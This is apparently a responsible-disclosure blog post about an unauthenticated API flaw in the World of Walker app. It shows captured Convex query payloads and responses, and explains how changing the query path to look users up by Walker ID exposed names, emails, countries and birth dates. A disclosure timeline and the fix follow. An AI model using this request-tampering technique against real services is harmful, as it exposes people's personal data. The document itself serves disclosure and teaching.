# World of Walker data leak

*Merely minutes after launch, I discovered a critical flaw in the world of walker site, that could leak any user's full name, email address, country, and date of birth - simply from their walker ID.*

**TL;DR:** The World of Walker API exposed personal user data including full names, emails, country, and D.O.B. via unauthenticated queries using Walker IDs or Clerk IDs. This was discovered minutes after launch and responsibly disclosed, with the issue fixed within hours.

## Finding a Walker ID

If you didn't know, finding an Alan Walker fan's Walker ID is trivially easy.

Examples:

- The Discord server, where thousands of users have their Walker ID in their display name or bio.
- The Minecraft server, where many players have placed signs with their Walker ID and username in shape of a petition.

Or, you can simply ask someone, and they'll more likely than not give it to you.

## The Bug

On 08/08/25, a few minutes after the World of Walker app launch, I was trying to create an account, as well as the other thousands of users who had been waiting months for this day. However, we were getting stuck on verifying.
I decided to look in console, and was met with this:

```json
{
  "code":"TooManyConcurrentRequests",
  "message":"Too many concurrent requests. Your backend is limited to 16 concurrent mutations. To get more resources, upgrade to Convex Pro. If you are already on Convex Pro, please contact support."
}
```

This gave me my first clue. The app was using a Convex backend.

With this in mind, I took a look at the network requests.
One of them was sending a network request to the Convex database: `https://backend-vk8gk4ookgkwcgk8g0kk4kso.kreatell.gg`.

The route was `/api/mutation`, and there was a JSON payload:

```json
{
  "path": "users:ensureUserExists",
  "format": "convex_encoded_json",
  "args": [
    {
      "clerkUserId": "user_xxx",
      "email": "xxx@xxx.com",
      "ensureWalkerId": true,
      "nickname": "xxx",
      "walkerId": 1234
    }
  ]
}
```

This gave us several clues.

1. `path`: `users:ensureUserExists`
   - This, obviously, tells us that there is a backend path for ensuring a user exists.
2. `format`: `convex_encoded_json`
   - This tells us that the API is being sent to Convex, as expected.
3. `args`: `[...]`
   - This provides arguments to the `ensureUserExists` backend route. The arguments shown were the ones entered from the login page.
4. The Response
   - The response was the Convex TooManyConcurrentRequests error shown previously. This would have been the root cause of the login failure for me and all the other users: the fact that the Convex tier only allowed 16 concurrent logins at once.

From here, I decided to continue watching the login page for more browser requests.
I eventually saw this:

Route: `/api/query`
Payload:
```json
{
  "path": "users:getUserByClerkId",
  "format": "convex_encoded_json",
  "args": [
    {
      "clerkUserId": "user_abcd1234"
    }
  ]
}
```

This gave us more clues.
1. `/api/query`
   - Since this is a query, and not a mutation, this route was succeeding and giving us information, instead of an error message.
2. `path`: `users:getUserByClerkId`
   - This path on the backend allows us to get user information simply from their Clerk ID.
3. `args`: `[...]`
   - The args are simply just the `clerkUserId` to find the user from.
4. The Response
   - The response was a 200 message with the JSON data, instead of a 429, as the route did not have the limit set for mutations.
     Here is the response:

```json
{
  "status": "success",
  "value": {
    "_creationTime": 1754634301971.9727,
    "_id": "xxxxx",
    "ageVerified": true,
    "clerkUserId": "user_abcd1234",
    "country": "XX",
    "createdAt": 1754634301972,
    "dateOfBirth": "XXXX-XX-XX",
    "email": "xxx@xxx.com",
    "experiencePoints": 0,
    "lastUpdated": 1754634511192,
    "level": 1,
    "lumin": 0,
    "nickname": "John Doe",
    "schemaVersion": 4,
    "totalEarned": 0,
    "totalSpent": 0,
    "walkerId": 123456,
    "walkoins": 0
  }
}
```

This gives us a whole lot of information.
Most importantly, it tells us:
- Their country: `["value"]["country"]`
- Their email: `["value"]["email"]`
- Their D.O.B: `["value"]["dateOfBirth"]`
- Their full name: `["value"]["nickname"]`

This could all be gotten simply from their `clerkUserId`.
But, how would we get a users clerkUserId from just their Walker ID?

To put it simply, trial and error.

First, I tried changing the argument from `clerkUserID` to `walkerId`, and inputting a Walker ID.

I got the error:

```json
{
  "status": "error",
  "errorMessage": "[Request ID: b1c1fd6a9bb990a5] Server Error\nArgumentValidationError: Object is missing the required field `clerkUserId`. Consider wrapping the field validator in `v.optional(...)` if this is expected.\n\nObject: {walkerId: 123456.0}\nValidator: v.object({clerkUserId: v.string()})\n\n"
}
```

> [Request ID: b1c1fd6a9bb990a5] Server Error
> ArgumentValidationError: Object is missing the required field `clerkUserId`. Consider wrapping the field validator in `v.optional(...)` if this is expected.
>
> Object: {walkerId: 123456.0}
> Validator: v.object({clerkUserId: v.string()})

So, the `getUserByClerkId` path required a `clerkUserId` argument. Understandable.

Next, I tried to change the path from `users:getUserByClerkId` to `users:getUserByWalkerId`, keeping the `walkerId` argument.
Success! It worked!

It provided all the same data as the previous `getUserByClerkId` response. This means, it gives us their country, email, date of birth, and full name!

## Disclosure

At 07:42 BST on the day I found the bug (08/08/25), I sent a DM on Discord to the Local Community Manager (of India), informing them about the bug, including an example.
Merely 5 minutes later, at 07:47 BST, they told me that they had shared the matter with Team Alan India, and they were sending the matter to the main headquarters.

At 07:54 I finished a brief overview of the bug and sent it to them via email. By 07:58AM, the Head of Interactive Experiences (Olaf) had seen the bug and sent it to the developers.

At 09:29, the team requested to speak to me. At 09:47, Bitsnoxx (who seemed to be the lead developer) asked me more about the exploit.

Although I'm not sure when exactly it was fixed, somewhere between 11:46 and 14:37 the bug had been fixed, and the server was now responding with

```json
{
  "status": "error",
  "errorMessage": "[Request ID: 5206b5e8719df7c8] Server Error\nUncaught Error: Authentication required\n    at requireAuth (../../convex/auth.ts:10:9)\n    at async handler (../convex/users.ts:121:9)\n"
}
```

> [Request ID: 5206b5e8719df7c8] Server Error
> Uncaught Error: Authentication required
>     at requireAuth (../../convex/auth.ts:10:9)
>     at async handler (../convex/users.ts:121:9)

## Final Thoughts

This bug was a huge privacy issue, but luckily got fixed fast enough due to responsible reporting.
It's a classic case of unauthenticated DB access, just like the recent Tea hack.

Hopefully, sharing this helps others avoid similar mistakes.
